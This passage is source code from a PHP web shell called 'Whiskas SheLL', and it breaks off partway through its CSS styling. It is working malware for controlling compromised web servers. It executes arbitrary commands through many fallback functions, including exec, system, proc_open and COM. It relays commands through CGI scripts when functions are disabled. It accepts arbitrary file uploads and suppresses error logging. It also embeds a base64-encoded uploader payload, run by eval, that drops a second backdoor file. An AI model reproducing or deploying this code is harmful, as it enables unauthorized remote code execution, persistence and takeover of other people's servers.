		$cmd = "check=W3NvbGV2aXNpYmxlfmFwaV0=&cmd=".__ZW5jb2Rlcg("cd ".$GLOBALS['cwd'].";".$cmd);
		if($is_curl){
			$address = ($_SERVER['SERVER_PORT'] == 443 ? "https://" : "http://").$_SERVER["SERVER_NAME"].dirname($_SERVER["REQUEST_URI"])."/".$cgi_url;
			$post = new WHISKASCURL();
			$data = $post->Send($address, "post", $cmd);
		}elseif($is_socket){
			$server = $_SERVER["SERVER_NAME"];
			$uri = dirname($_SERVER["REQUEST_URI"])."/".$cgi_url;
			$data = _WHISKAS_fsockopen($server,$uri,$cmd);
		}
		$out = "";
		if(strpos($data, "[solevisible~api]") !== false && strpos($data, '[solevisible~api]<pre>"+output+"</pre>') === false){
			if($set_cookie){
				__WHISKAS_set_cookie("WHISKAScgiapi", $lang);
			}
			if(@preg_match("/<pre>(.*?)<\/pre>/s", $data, $res)){
				$out = $res[1];
			}
		}elseif($lang=="perl"){
			return _WHISKAS_cgicmd($cmd_pure,"py",$set_cookie);
		}elseif($lang=="py"){
			return _WHISKAS_cgicmd($cmd_pure,"bash",$set_cookie);
		}elseif($lang=="bash" && $GLOBALS['sys']=="win"){
			return _WHISKAS_cgicmd($cmd_pure,"aspx",$set_cookie);
		}else{
			if($set_cookie){
				__WHISKAS_set_cookie("WHISKAScgiapi_mode", "off");
			}
		}
		return trim($out);
	}else{
		return "";
	}
}
function WHISKASGetCwd(){
	if(function_exists("getcwd")){
		return @getcwd();
	}else{
		return dirname($_SERVER["SCRIPT_FILENAME"]);
	}
}
function WHISKASEx($in,$re=false,$cgi=true,$all=false){
	$data = _WHISKAS_php_cmd($in,$re);
	if(empty($data)&&$cgi||$all){
		if($GLOBALS['sys']=='unix'){
			if(strlen(_WHISKAS_php_cmd("whoami"))==0||$all){
				$cmd = _WHISKAS_cgicmd($in);
				if(!empty($cmd)){
					return $cmd;
				}
			}
		}
	}
	return $data;
}
function _WHISKAS_php_cmd($in,$re=false){
$out='';
try{
if($re)$in=$in." 2>&1";
if(function_exists('exec')){
@exec($in,$out);
$out = @join("\n",$out);
}elseif(function_exists('passthru')) {
ob_start();
@passthru($in);
$out = ob_get_clean();
}elseif(function_exists('system')){
ob_start();
@system($in);
$out = ob_get_clean();
} elseif (function_exists('shell_exec')) {
$out = shell_exec($in);
}elseif(function_exists("popen")&&function_exists("pclose")){
if(is_resource($f = @popen($in,"r"))){
$out = "";
while(!@feof($f))
$out .= fread($f,1024);
pclose($f);
}
}elseif(function_exists('proc_open')){
$pipes = array();
$process = @proc_open($in.' 2>&1', array(array("pipe","w"), array("pipe","w"), array("pipe","w")), $pipes, null);
$out=@stream_get_contents($pipes[1]);
}elseif(class_exists('COM')){
$WHISKASWs = new COM('WScript.shell');
$exec = $WHISKASWs->exec('cmd.exe /c '.$_POST['WHISKAS1']);
$stdout = $exec->StdOut();
$out=$stdout->ReadAll();
}
}catch(Exception $e){}
return $out;
}
function _WHISKAS_fsockopen($server,$uri,$post){
	$socket = @fsockopen($server, 80, $errno, $errstr, 15);
	if($socket){
		$http  = "POST {$uri} HTTP/1.0\r\n";
		$http .= "Host: {$server}\r\n";
		$http .= "User-Agent: " . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
		$http .= "Content-Type: application/x-www-form-urlencoded\r\n";
		$http .= "Content-length: " . strlen($post) . "\r\n";
		$http .= "Connection: close\r\n\r\n";
		$http .= $post . "\r\n\r\n";
		fwrite($socket, $http);
		$contents = "";
		while (!@feof($socket)) {
			$contents .= @fgets($socket, 4096);
		}
		list($header, $body) = explode("\r\n\r\n", $contents, 2);
		@fclose($socket);
		return $body;
	}else{
		return "";
	}
}
if(isset($_GET["WHISKAS"])){
@error_reporting(E_ALL ^ E_NOTICE);
echo '<html>';
echo '<head><style>body{background:#000;margin:0;padding:20px;color:#39FF14;min-height:100vh} input,textarea,select,span,div,p,td,th,pre,code,a,font,b,i,u,li,label,[contenteditable]{color:#FFFFFF !important;} input[type="text"],input[type="password"],input[type="number"],textarea,[contenteditable]{background:#111 !important;border:1px solid #FFFFFF !important;color:#FFFFFF !important;} input[type="submit"],button{background:#FFFFFF !important;color:#000 !important;} pre{color:#FFFFFF !important;} *{caret-color:#FFFFFF !important;} ::placeholder{color:#0a6e06 !important;} input:-webkit-autofill{-webkit-text-fill-color:#FFFFFF !important;-webkit-box-shadow:0 0 0 1000px #111 inset !important;}</style></head>';
echo "<title>.: WHISKAS Hidden Terminal :.</title>";
echo "<body bgcolor=#000000>";
echo '<b><big><font color=#7CFC00>Kernel : </font><font color="#FFFFF">'.(function_exists('php_uname')?php_uname():'???').'</font></b></big>';
$safe_mode = @ini_get('safe_mode');
if($safe_mode){$r = "<b style='color: red'>On</b>";}else{$r = "<b style='color: green'>Off</b>";}
echo "<br><b style='color: #7CFC00'>OS: </font><font color=white>" . PHP_OS . "</font><br>";
echo "<b style='color: #7CFC00'>Software: </font><font color=white>" . $_SERVER ['SERVER_SOFTWARE'] . "</font><br>";
echo "PHP Version: <font color=white>" . PHP_VERSION .  "</font><br />";
echo "PWD:<font color=#FFFFFF> " . str_replace("\\","/",@WHISKASGetCwd()) . "/<br />";
echo "<b style='color: #7CFC00'>Safe Mode : $r<br>";
echo"<font color=#7CFC00>Disable functions : </font>";
$disfun = @ini_get('disable_functions');
if(empty($disfun)){$disfun = '<font color="green">NONE</font>';}
echo"<font color=red>";echo "$disfun";
echo"</font><br>";
echo "<b style='color: #7CFC00'>Your Ip Address is :  </font><font color=white>" . $_SERVER['REMOTE_ADDR'] . "</font><br>";
echo "<b style='color: #7CFC00'>Server Ip Address is :  </font><font color=white>".(function_exists('gethostbyname')?@gethostbyname($_SERVER["HTTP_HOST"]):'???')."</font><br><p>";
echo '<hr><center><form onSubmit="this.upload.disabled=true;this.cwd.value = btoa(unescape(encodeURIComponent(this.cwd.value)));" action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo 'CWD: <input type="text" name="cwd" value="'.str_replace("\\","/",@WHISKASGetCwd()).'/" size="59"><p><input type="file" name="file" size="45"><input name="upload" type="submit" id="_upl" value="Upload"></p></form></center>';
if(isset($_FILES['file'])){
if(@move_uploaded_file($_FILES['file']['tmp_name'], __ZGVjb2Rlcg(@$_POST['cwd']).'/'.$_FILES['file']['name'])){ echo '<b><font color="#7CFC00"><center>Upload Successfully ;)</font></a><font color="#7CFC00"></b><br><br></center>'; }
else{echo '<center><b><font color="#7CFC00">Upload failed :(</font></a><font color="#7CFC0"></b></center><br><br>'; }
}
echo '<hr><form onSubmit="this.execute.disabled=true;this.command_solevisible.value = btoa(unescape(encodeURIComponent(this.command_solevisible.value)));" method="POST"><span style="color:#fff;">Execute Command:</span> <input name="command_solevisible" value="" size="59" type="text" align="left" style="background:#111;color:#fff;border:1px solid #39FF14;padding:4px;" ><input name="execute" value="Execute" type="submit" style="background:#39FF14;color:#000;border:none;padding:5px 10px;cursor:pointer;font-weight:bold;"><br></form>
<hr><pre>';
if(isset($_POST['command_solevisible'])){
if(strtolower(substr(PHP_OS,0,3))=="win")$separator='&';else $separator=';';
$solevisible = "cd '".addslashes(str_replace("\\","/",@WHISKASGetCwd()))."'".$separator."".__ZGVjb2Rlcg($_POST['command_solevisible']);
echo WHISKASEx($solevisible);
}
echo'</pre>
</body></html>';
exit;}
@error_reporting(E_ALL ^ E_NOTICE);
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('magic_quotes_runtime', 0);
@set_time_limit(0);
if(function_exists('set_magic_quotes_runtime')){
@set_magic_quotes_runtime(0);
}
foreach($_POST as $key => $value){
if(is_array($_POST[$key])){
$i=0;
foreach($_POST[$key] as $f) {
$f = trim(str_replace(' ', '+',$f));
$_POST[$key][$i] = decrypt_post($f);
$i++;
}
}else{
$value = trim(str_replace(' ', '+',$value));
$_POST[$key] = decrypt_post($value);
}
}
$default_action = 'FilesMan2';//'FilesMan';
$default_use_ajax = true;
$default_charset = 'Windows-1251';
if(strtolower(substr(PHP_OS,0,3))=="win")
$GLOBALS['sys']='win';
else
$GLOBALS['sys']='unix';
$GLOBALS['home_cwd'] = @WHISKASGetCwd();
$GLOBALS["need_to_update_header"] = "false";
$GLOBALS['glob_chdir_false'] = false;
if(isset($_POST['c'])){
if(!@chdir($_POST['c'])){
	$GLOBALS['glob_chdir_false'] = true;
}
}
$GLOBALS['cwd'] = (isset($_POST['c']) && @is_dir($_POST['c']) ?$_POST['c']:@WHISKASGetCwd());
if($GLOBALS['glob_chdir_false']){
	$GLOBALS['cwd'] = (isset($_POST['c']) && !empty($_POST['c']) ? $_POST['c'] : @WHISKASGetCwd());
}
if($GLOBALS['sys'] == 'win'){
$GLOBALS['home_cwd'] = str_replace("\\", "/", $GLOBALS['home_cwd']);
$GLOBALS['cwd'] = str_replace("\\", "/", $GLOBALS['cwd']);
}
if($GLOBALS['cwd'][strlen($GLOBALS['cwd'])-1] != '/' )$GLOBALS['cwd'] .= '/';
if(!function_exists('sys_get_temp_dir')){function sys_get_temp_dir() {foreach (array('TMP', 'TEMP', 'TMPDIR') as $env_var) {if ($temp = getenv($env_var)) {return $temp;}}$temp = tempnam($GLOBALS['__file_path'], '');if (_WHISKAS_file_exists($temp,false)) {unlink($temp);return dirname($temp);}return null;}}
if(!function_exists("mb_strlen")){
	function mb_strlen($str, $c=""){
		return strlen($str);
	}
}
if(!function_exists("mb_substr")){
	function mb_substr($str, $start, $end, $c=""){
		return substr($str, $start, $end);
	}
}
define("WHISKAS_TEMPDIR", (function_exists("sys_get_temp_dir") ? (@is_writable(str_replace('\\','/',sys_get_temp_dir()))?sys_get_temp_dir():(@is_writable('.')?'.':false)) : false));
function WHISKAShead(){
$GLOBALS['__WHISKAS_SHELL_CODE'] = 'PD9waHAgZWNobyAiPHRpdGxlPlhMaXN0IEhpZGRlbiBVcGxvYWRlcjwvdGl0bGU+XG48Ym9keSBiZ2NvbG9yPSMwMDAwMDA+XG48YnI+XG48Y2VudGVyPjxmb250IGNvbG9yPVwid2hpdGVcIj48Yj5Zb3VyIElwIEFkZHJlc3MgaXM8L2I+IDxmb250IGNvbG9yPVwid2hpdGVcIj48L2ZvbnQ+PC9jZW50ZXI+XG48YmlnPjxmb250IGNvbG9yPVwiIzdDRkMwMFwiPjxjZW50ZXI+XG4iO2VjaG8gJF9TRVJWRVJbJ1JFTU9URV9BRERSJ107ZWNobyAiPC9jZW50ZXI+PC9mb250PjwvYT48Zm9udCBjb2xvcj1cIiM3Q0ZDMDBcIj5cbjxicj5cbjxicj5cbjxjZW50ZXI+PGZvbnQgY29sb3I9XCIjN0NGQzAwXCI+PGJpZz5YTGlzdCBVcGxvYWQgQXJlYTwvYmlnPjwvZm9udD48L2E+PGZvbnQgY29sb3I9XCIjN0NGQzAwXCI+PC9mb250PjwvY2VudGVyPjxicj5cbjxjZW50ZXI+PGZvcm0gbWV0aG9kPSdwb3N0JyBlbmN0eXBlPSdtdWx0aXBhcnQvZm9ybS1kYXRhJyBuYW1lPSd1cGxvYWRlcic+IjtlY2hvICc8aW5wdXQgdHlwZT0iZmlsZSIgbmFtZT0iZmlsZSIgc2l6ZT0iNDUiPjxpbnB1dCBuYW1lPSJfdXBsIiB0eXBlPSJzdWJtaXQiIGlkPSJfdXBsIiB2YWx1ZT0iVXBsb2FkIj48L2Zvcm0+PC9jZW50ZXI+JztpZihpc3NldCgkX1BPU1RbJ191cGwnXSkmJiRfUE9TVFsnX3VwbCddPT0gIlVwbG9hZCIpe2lmKEBtb3ZlX3VwbG9hZGVkX2ZpbGUoJF9GSUxFU1snZmlsZSddWyd0bXBfbmFtZSddLCAkX0ZJTEVTWydmaWxlJ11bJ25hbWUnXSkpIHtlY2hvICc8Yj48Zm9udCBjb2xvcj0iIzdDRkMwMCI+PGNlbnRlcj5VcGxvYWQgU3VjY2Vzc2Z1bGx5IDspPC9mb250PjwvYT48Zm9udCBjb2xvcj0iIzdDRkMwMCI+PC9iPjxicj48YnI+Jzt9ZWxzZXtlY2hvICc8Yj48Zm9udCBjb2xvcj0iIzdDRkMwMCI+PGNlbnRlcj5VcGxvYWQgZmFpbGVkIDooPC9mb250PjwvYT48Zm9udCBjb2xvcj0iIzdDRkMwMCI+PC9iPjxicj48YnI+Jzt9fWVjaG8gJzxjZW50ZXI+PHNwYW4gc3R5bGU9ImZvbnQtc2l6ZTozMHB4OyBiYWNrZ3JvdW5kOiB1cmwoJnF1b3Q7aHR0cDovL3NvbGV2aXNpYmxlLmNvbS9pbWFnZXMvYmdfZWZmZWN0X3VwLmdpZiZxdW90OykgcmVwZWF0LXggc2Nyb2xsIDAlIDAlIHRyYW5zcGFyZW50OyBjb2xvcjogcmVkOyB0ZXh0LXNoYWRvdzogOHB4IDhweCAxM3B4OyI+PHN0cm9uZz48Yj48YmlnPnhwb3Nla3dAZ21haWwuY29tPC9iPjwvYmlnPjwvc3Ryb25nPjwvc3Bhbj48L2NlbnRlcj4nOz8+';
$WHISKAS_uploader = '$x = base64_decode("'.$GLOBALS['__WHISKAS_SHELL_CODE'].'");$solevisible = fopen("WHISKAS09.php","w");fwrite($solevisible,$x);';
define("WHISKAS_UPLOADER", "eval(base64_decode('".__ZW5jb2Rlcg($WHISKAS_uploader)."'))");
if(!isset($_POST['ajax'])){
function WHISKAS_GetDisable_Function(){
$disfun = @ini_get('disable_functions');
$afa = '<span class="header_show_all">All Functions Accessible</span>';
if(empty($disfun))return($afa);
$s = explode(',',$disfun);
$s = array_unique($s);
$i=0;
$b=0;
$func = array('system','exec','shell_exec','proc_open','popen','passthru','symlink','dl');
$black_list = array();
$allow_list = array();
foreach($s as $d){
	$d=trim($d);
	if(empty($d)||!is_callable($d))continue;
	if(!function_exists($d)){
		if(in_array($d,$func)){
			$dis .= $d." | ";$b++;
			$black_list[] = $d;
		}else{
			$allow_list[] = $d;
		}
		$i++;
	}
}
if($i==0)return($afa);
if($i <= count($func)){
$all = array_values(array_merge($black_list, $allow_list));
return('<span class="disable_functions">'.implode(" | ", $all).'</span>');
}
return('<span class="disable_functions">'.$dis.'</span><a id="menu_opt_GetDisFunc" href=javascript:void(0) onclick="WHISKAS_can_add_opt = true;g(\'GetDisFunc\',null,\'wp\');"><span class="header_show_all">Show All ('.$i.')</span></a>');
}
function WHISKASNum(){
$args = func_get_args();
$WHISKASx = array();
$find = array();
for($i=1;$i<=10;$i++){
$WHISKASx[] = $i;
}
foreach($args as $arg){
$find[] = $arg;
}
echo '<script>';
foreach($WHISKASx as $WHISKAS){
if(in_array($WHISKAS,$find))
continue;
echo 'WHISKAS'.$WHISKAS."_=";
}
echo '""</script>';
}
if(empty($_POST['charset']))
$_POST['charset'] = $GLOBALS['default_charset'];
$freeSpace = function_exists('diskfreespace')?@diskfreespace($GLOBALS['cwd']):'?';
$totalSpace = function_exists('disk_total_space')?@disk_total_space($GLOBALS['cwd']):'?';
$totalSpace = $totalSpace?$totalSpace:1;
$on="<span class='header_on'> ON </span>";
$of="<span class='header_off'> OFF </span>";
$none="<span class='header_none'> NONE </span>";
if(function_exists('ssh2_connect'))
$ssh2=$on;
else
$ssh2=$of;
if(function_exists('curl_version'))
$curl=$on;
else
$curl=$of;
if(function_exists('mysql_get_client_info')||class_exists('mysqli'))
$mysql=$on;
else
$mysql=$of;
if(function_exists('mssql_connect'))
$mssql=$on;
else
$mssql=$of;
if(function_exists('pg_connect'))
$pg=$on;
else
$pg=$of;
if(function_exists('oci_connect'))
$or=$on;
else
$or=$of;
if(@ini_get('disable_functions'))
$disfun=@ini_get('disable_functions');
else
$disfun="All Functions Enable";
if(@ini_get('safe_mode'))
$safe_modes="<span class='header_off'>ON</span>";
else
$safe_modes="<span class='header_on'>OFF</span>";
$cgi_shell="<span class='header_off' id='header_cgishell'>OFF</span>";
if(@ini_get('open_basedir')){
$basedir_data = @ini_get('open_basedir');
if(strlen($basedir_data)>120){
$open_b=substr($basedir_data,0, 120)."...";
}else{
$open_b = $basedir_data;
}
}else{$open_b=$none;}
if(@ini_get('safe_mode_exec_dir'))
$safe_exe=@ini_get('safe_mode_exec_dir');
else
$safe_exe=$none;
if(@ini_get('safe_mode_include_dir'))
$safe_include=@ini_get('safe_mode_include_dir');
else
$safe_include=$none;
if(!function_exists('posix_getegid'))
{
$user = function_exists("get_current_user")?@get_current_user():"????";
$uid =function_exists("getmyuid")?@getmyuid():"????";
$gid = function_exists("getmygid")?@getmygid():"????";
$group = "?";
}else{
$uid = function_exists("posix_getpwuid")&&function_exists("posix_geteuid")?@posix_getpwuid(posix_geteuid()):array("name"=>"????", "uid"=>"????");
$gid = function_exists("posix_getgrgid")&&function_exists("posix_getegid")?@posix_getgrgid(posix_getegid()):array("name"=>"????", "gid"=>"????");
$user = $uid['name'];
$uid = $uid['uid'];
$group = $gid['name'];
$gid = $gid['gid'];
}
$cwd_links = '';
$path = explode("/", $GLOBALS['cwd']);
$n=count($path);
for($i=0; $i<$n-1; $i++) {
$cwd_links .= "<a class='header_pwd' onclick='g(\"FilesMan\",\"";
$cach_cwd_path = "";
for($j=0; $j<=$i; $j++){
$cwd_links .= $path[$j].'/';
$cach_cwd_path .= $path[$j].'/';
}
$cwd_links .= "\")' path='".$cach_cwd_path."' href='#action=fileman&path=".$cach_cwd_path."'>".$path[$i]."/</a>";
}
$drives = "";
foreach(range('a','z') as $drive)
if(@is_dir($drive.':\\'))
$drives .= '<a href="javascript:void(0);" class="header_drive" onclick="g(\'FilesMan\',\''.$drive.':/\')">[ '.$drive.' ]</a> ';
$csscode ='	-moz-animation-name: spin;-moz-animation-iteration-count: infinite;-moz-animation-timing-function: linear;-moz-animation-duration: 1s;-webkit-animation-name: spin;-webkit-animation-iteration-count: infinite;-webkit-animation-timing-function: linear;-webkit-animation-duration: 1s;-ms-animation-name: spin;-ms-animation-iteration-count: infinite;-ms-animation-timing-function: linear;-ms-animation-duration: 1s;animation-name: spin;animation-iteration-count: infinite;animation-timing-function: linear;animation-duration: 1s;';
echo '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta name="ROBOTS" content="NOINDEX, NOFOLLOW" />
<link href="'.__showicon('WHISKASmini').'" rel="icon" type="image/x-icon"/>
<title>..:: '.$_SERVER['HTTP_HOST'].' ~ Whiskas SheLL | '.__WHISKAS_CODE_NAME__.' SheLL v'.__WHISKAS_VERSION__.' ::..</title>
<style type="text/css">';?>

@keyframes rotateNeon {
  0% {
    transform: rotate(0deg);
    filter: hue-rotate(0deg);
  }
  100% {
    transform: rotate(360deg);
    filter: hue-rotate(360deg);
  }
}

.header, #meunlist, .foot {
  position: relative;
  border: none !important;
  background: linear-gradient(to bottom, #1e1e1e 0, #040404 55%, #000000 100%);
  z-index: 0;
  overflow: hidden;
  padding: 5px;
  border-radius: 8px; 
}

.header::before, #meunlist::before, .foot::before {
  content: '';
  position: absolute;
  z-index: -2;
  left: -50%;
  top: -50%;
  width: 200%;
  height: 200%;
  background-color: #000;
  background-repeat: no-repeat;
  background-size: 50% 50%;
  background-image: conic-gradient(transparent, #51ff00, #FFFFFF, transparent 30%);
  animation: rotateNeon 4s linear infinite;
}

.header::after, #meunlist::after, .foot::after {
  content: '';
  position: absolute;
  inset: 3px;
  background: inherit;
  z-index: -1;
  border-radius: inherit;
}
@keyframes neonPulseAndRotate{0%{transform:scale(1) rotate(0deg);filter:drop-shadow(0 0 5px #FFFFFF) drop-shadow(0 0 5.5px #FFFFFF)}25%{transform:scale(1.1) rotate(0deg);filter:drop-shadow(0 0 20px #FFFFFF) brightness(1.2)}50%{transform:scale(1) rotate(360deg);filter:drop-shadow(0 0 5px #FFFFFF)}75%{transform:scale(1.1) rotate(360deg);filter:drop-shadow(0 0 20px #FFFFFF) brightness(1.2)}100%{transform:scale(1) rotate(360deg);filter:drop-shadow(0 0 5px #FFFFFF) drop-shadow(0 0 10px #FFFFFF)}}img[src*="dk-profile.png"]{display:block;margin:0 auto;position:relative;z-index:10;animation:neonPulseAndRotate 5s cubic-bezier(0.85, -0.2, 0.29, 1.28) infinite;backface-visibility:hidden;-webkit-font-smoothing:antialiased}img[src*="dk-profile.png"]:hover{animation-play-state:paused;filter:drop-shadow(0 0 30px #51ff00) brightness(1.5);cursor:pointer}
hlabale{color:#39FF14;border-radius:4px;border:1px solid #F8F8FF;margin-left:7px;padding:2px}#tbl_sympphp tr{text-align:center}#PhpCode,.php-evals-ace,.view_ml_content{position:absolute;top:0;right:0;bottom:0;left:0;background:#1b292b26;top:50px}.editor-view{position:relative;height:100%}.view-content{position:absolute;overflow-y:auto;width:100%;height:93%}::-webkit-scrollbar-track{-webkit-box-shadow:inset 0 0 6px rgba(0,0,0,.3);border-radius:10px;background-color:#030303}::-webkit-scrollbar{width:10px;background-color:#030303}::-webkit-scrollbar-thumb{border-radius:10px;-webkit-box-shadow:inset 0 0 6px rgba(0,0,0,.3);background-color:#1e82b5}.editor-file-name{margin-left:29px;margin-top:4px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}.editor-icon{position:absolute}.is_active{background:rgba(49,55,93,.77);border-radius:10px}.history-list{height:88%;overflow-y:auto}.opt-title{position:absolute;left:50%;top:50%;transform:translate(-50%,-50%);color:#39ff14;font-size:25px;font-family:monospace}.options_min_badge{visibility:hidden;text-align:center;right:30px;color:#000;background:#2a8a24;padding:6px;border-radius:50%;width:15px;height:15px;display:inline-block;position:absolute;top:-7px}#cgiloader-minimized,#database_window-minimized,#editor-minimized,#options_window-minimized{display:block;position:fixed;right:-30px;width:30px;height:30px;top:30%;z-index:9999}.minimized-wrapper{position:relative;background:#39FF14;width:44px;height:130px;cursor:pointer;border-bottom-left-radius:5px;border-top-left-radius:5px}.minimized-text{transform:rotate(-90deg);color:#000;font-size:x-large;display:inline-block;position:absolute;right:-51px;width:129px;top:-10px;border-top-left-radius:4%;height:56px;padding:3px}.close-button,.editor-minimize{height:26px;width:38px;right:7px;background:#0E304AB7;cursor:pointer;position:absolute;box-sizing:border-box;display:inline-block;top:17px;border-radius:100px}.close-button{text-align:center;color:#fff;font-size:18px;font-weight:bold;line-height:26px}.editor-minimize{right:50px;line-height:50px}.close-button:after,.close-button:before{content:none}.editor-minimize:before{transform:rotate(-45deg);content:"";position:absolute;top:63%;right:6px;margin-top:-5px;margin-left:-25px;display:block;height:4px;width:27px;background-color:rgb(255 255 255);transition:all .25s ease-out}.editor-minimize:before{transform:rotate(0)}.close-button:hover{background-color:rgba(39,66,80,.96);color:red}.editor-minimize:hover:before{background-color:red}.editor-minimize:hover{background-color:rgba(39,66,80,.96)}#cgiloader,#database_window,#editor,#options_window{display:none;position:fixed;top:0;width:100%;height:100%;z-index:20}.editor-wrapper{width:100%;height:100%;position:relative;top:1%}.editor-header{width:97%;background:linear-gradient(to bottom, #4b4b4b 0, #232323 55%, #272727 100%);height:37px;margin-left:13px;position:relative;border-top-left-radius:15px;border-top-right-radius:15px}.editor-path{position:absolute;font-size:x-large;margin-left:10px;top:6px;color:#00ff7f}.editor-modal{position:relative;top:0;background-color:rgba(0,1,23,.95);height:90%;margin-left:20%;margin-right:2%;border:2px #39FF14 solid}.editor-explorer{width:19%;height:90%;background-color:rgba(0,1,23,.94);position:absolute;z-index:2;left:1%;border:2px #39FF14 solid}.editor-controller{position:relative;top:-13px}.file-holder{position:relative;width:100%;height:30px}.file-holder>.history{position:absolute;color:#03b3a3;cursor:pointer;left:5px;font-size:18px;font-family:sans-serif;width:89%;height:100%;z-index:3;border-radius:10px;transition:background-color .6s ease-out}.file-holder>.history-close{display:block;opacity:0;position:absolute;right:2px;width:20px;top:4px;text-align:center;cursor:pointer;color:#000;background:red;border-radius:100px;font-family:monospace;z-index:10;transition:opacity .6s ease-out;font-size:15px;height:19px}.file-holder>.history:hover{background-color:#646464}.editor-explorer>.hheader{position:relative;color:#14ff07;border-bottom:2px #14ff07 solid;text-align:center;font-family:sans-serif;margin-bottom:10px;height:55px}.editor-search{position:absolute;bottom:7px;left:31px}.hheader-text{position:absolute;left:8px;top:2px}.history-clear{position:absolute;right:8px;top:2px;cursor:pointer}.editor-body{position:relative;margin-left:3px;height:100%}.editor-anim-close{-webkit-animation:editorClose .8s ease-in-out forwards;-moz-animation:editorClose .8s ease-in-out forwards;-ms-animation:editorClose .8s ease-in-out forwards;animation:editorClose .8s ease-in-out forwards}@keyframes editorClose{0%{visibility:1;opacity:1}100%{visibility:0;opacity:0}}.editor-anim-minimize{-webkit-animation:editorMinimize .8s ease-in-out forwards;-moz-animation:editorMinimize .8s ease-in-out forwards;-ms-animation:editorMinimize .8s ease-in-out forwards;animation:editorMinimize .8s ease-in-out forwards}@keyframes editorMinimize{0%{right:0;opacity:1}100%{right:-2000px;opacity:0}}.editor-anim-show{-webkit-animation:editorShow .8s ease-in-out forwards;-moz-animation:editorShow .8s ease-in-out forwards;-ms-animation:editorShow .8s ease-in-out forwards;animation:editorShow .8s ease-in-out forwards}@keyframes editorShow{0%{right:-2000px;opacity:0}100%{right:0;opacity:1}}.minimized-show{-webkit-animation:minimizeShow .8s ease-in-out forwards;-moz-animation:minimizeShow .8s ease-in-out forwards;-ms-animation:minimizeShow .8s ease-in-out forwards;animation:minimizeShow .8s ease-in-out forwards}@keyframes minimizeShow{0%{right:-30px;opacity:0}100%{right:0;opacity:1}}.minimized-hide{-webkit-animation:minimizeHide .8s ease-in-out forwards;-moz-animation:minimizeHide .8s ease-in-out forwards;-ms-animation:minimizeHide .8s ease-in-out forwards;animation:minimizeHide .8s ease-in-out forwards}@keyframes minimizeHide{0%{right:0;opacity:1}100%{right:-30px;opacity:0}}.solevisible-text:hover{-webkit-text-shadow:0 0 25px #0f0;-moz-text-shadow:0 0 25px #0f0;-ms-text-shadow:0 0 25px #0f0;text-shadow:0 0 25px #0f0}.update-holder{position:fixed;top:0;background-color:rgba(0,24,29,.72);width:100%;height:100%}.update-content{position:relative}.update-content>a{text-decoration:none;position:absolute;color:rgba(103,167,47,.77);left:24%;margin-top:7%;font-size:40px}.update-close{position:absolute;right:0;margin-right:23px;top:10px;font-size:27px;background-color:#130f50;width:5%;border-radius:100px;cursor:pointer;border:2px #0e265a solid}.update-close:hover{border:2px #39FF14 solid;color:red}.filestools{height:auto;width:auto;color:#39FF14;font-size:12px;font-family:Verdana,Geneva,sans-serif}@-moz-document url-prefix(){#search-input{width:173px}.editor-path{top:3px}}.filters-holder{padding:5px;padding-left:10px}.filters-holder input{width:200px}.filters-holder span{color:#8bc7f7}#rightclick_menu{width:175px;visibility:hidden;opacity:0;position:fixed;background:linear-gradient(180deg, #FFFFFF 10%, #d7d7d7 50%, #bababa 100%);color:#555;font-family:sans-serif;font-size:11px;-webkit-transition:opacity .5s ease-in-out;-moz-transition:opacity .5s ease-in-out;-ms-transition:opacity .5s ease-in-out;-o-transition:opacity .5s ease-in-out;transition:opacity .5s ease-in-out;-webkit-box-shadow:-1px 0 17px 0 #8b8b8c;-moz-box-shadow:-1px 0 17px 0 #8b8b8c;box-shadow:-1px 0 17px 0 #8b8b8c;padding:0;border:1px solid #737373;border-radius:10px}#rightclick_menu a{display:block;color:#000;font-weight:bold;text-decoration:none;padding:6px 8px 6px 30px;position:relative;padding-left:40px;font-size:13px}#rightclick_menu a i.fa,#rightclick_menu a img{height:20px;font-size:17px;width:20px;position:absolute;left:5px;top:2px;padding-left:5px;filter:brightness(0)}#rightclick_menu a span{color:#bcb1b3;float:right}#rightclick_menu a:hover{color:#000;background:#3879d9}#rightclick_menu hr{border:1px solid #ebebeb;border-bottom:0}.cl-popup-fixed{position:fixed;top:0;left:0;width:100%;height:100%;background:#201e1ead}#shortcutMenu-holder{position:absolute;top:40%;left:50%;transform:translate(-50%,-50%);background:#1f1e1edb;height:190px;width:500px;color:#000;font-weight:bold}#shortcutMenu-holder>.popup-head{background:#207174;padding:6px;border-top:10px;text-align:center;font-family:sans-serif;color:#000;font-weight:bold}#shortcutMenu-holder>form{padding:10px}#shortcutMenu-holder>form>label{display:block}#shortcutMenu-holder>form>input{width:99%;height:24px;margin-top:4px;color:#000;outline:0;font-size:16px;font-weight:bold}#shortcutMenu-holder>.popup-foot{float:right;height:30px;margin-right:8px}#shortcutMenu-holder>.popup-foot>button{height:100%;cursor:pointer;color:#000;outline:0;font-weight:bold}.php-terminal-output{overflow:auto;height:86%;border:1px solid #00ff27;border-radius:10px;background:#000}.cmd-history-holder{visibility:hidden;opacity:0;position:absolute;color:#000000;background:#000000f2;top:-300px;height:300px;width:calc(69% + -11px);border-radius:10px 10px 0 0;left:calc(2% - 9px);transition:visibility .5s,opacity .5s linear}.cmd-history-holder .commands-history-header{background:#0e304aa6;text-align:center;border-radius:10px 10px 0 0}.cmd-history-icon{width:27px;top:6px;left:calc(68% + 5px);position:absolute;cursor:pointer}.history-cmd-line{padding:4px;border-bottom:1px dashed;cursor:pointer}.history-cmd-line:hover{background:#961111}#myUL,#myUL ul{list-style-type:none}#myUL{margin:0;padding:0}.box{cursor:pointer;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}.box::before{content:"\2610";color:#000;display:inline-block;margin-right:6px}.check-box::before{content:"\2611";color:#1e90ff}.nested{display:none}.active{display:block}.flag-holder>img{width:20px;vertical-align:middle;padding-left:6px}#options_window .content_options_holder .options_holder{position:relative;display:none;overflow:auto;min-height:70vh;max-height:calc(100vh - 100px)}#options_window .content_options_holder .options_holder .header{min-height:70vh}#options_window .content_options_holder .options_holder.option_is_active{display:block}#options_window .content_options_holder .options_tab{padding:5px;margin-left:14px;margin-right:30px;background:#000;border-bottom:7px solid rgb(255 255 255 / 